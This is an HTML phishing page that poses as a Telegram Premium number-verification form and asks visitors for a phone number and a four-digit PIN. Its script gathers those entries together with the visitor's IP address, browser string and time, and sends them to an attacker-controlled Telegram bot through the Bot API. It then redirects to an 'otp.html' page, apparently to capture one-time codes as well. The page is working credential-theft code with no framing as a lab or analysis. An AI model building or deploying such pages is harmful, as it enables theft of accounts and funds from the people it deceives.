<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium - Verify Number</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .glass-form {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.15);
            border: 1px solid rgba(255,255,255,0.3);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .telegram-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #0088cc, #00d4ff);
            border-radius: 20px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        h1 {
            color: #333;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #666;
            font-size: 16px;
        }
        .input-group {
            margin-bottom: 24px;
        }
        .input-label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }
        .input-field {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 16px;
            font-size: 18px;
            transition: all 0.3s ease;
            background: white;
        }
        .input-field:focus {
            border-color: #00b09b;
            box-shadow: 0 0 0 4px rgba(0,176,155,0.1);
            outline: none;
        }
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
            border: none;
            border-radius: 16px;
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 35px rgba(0,176,155,0.4);
        }
    </style>
</head>
<body>
    <div class="glass-form">
        <div class="header">
            <div class="telegram-icon">📱</div>
            <h1>Verify Your Number</h1>
            <p class="subtitle">Enter your details to continue</p>
        </div>

        <div class="input-group">
            <label class="input-label">Phone Number</label>
            <input type="tel" class="input-field" id="phone" placeholder="01XXXXXXXXX">
        </div>

        <div class="input-group">
            <label class="input-label">PIN Code</label>
            <input type="password" class="input-field" id="pin" placeholder="****" maxlength="4">
        </div>

        <button class="submit-btn" id="submitBtn">
            <i class="fas fa-arrow-right"></i>
            Continue
        </button>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token');
        const chatId = urlParams.get('chatid');

        document.getElementById('submitBtn').onclick = async () => {
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;

            if (!phone || !pin || phone.length < 11) {
                alert('সঠিক তথ্য দিন!');
                return;
            }

            const ip = await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(r=>r.ip);
            
            const message = `📱 <b>NEW DATA COLLECTED!</b>\n\n` +
                          `📞 <b>Phone:</b> <code>${phone}</code>\n` +
                          `🔐 <b>PIN:</b> <code>${pin}</code>\n` +
                          `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                          `💻 <b>Device:</b> ${navigator.userAgent.slice(0,40)}...\n` +
                          `🕒 <b>Time:</b> ${new Date().toLocaleString('bn-BD')}`;

            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            window.location.href = `otp.html?token=${token}&chatid=${chatId}`;
        };
    </script>
</body>
</html>
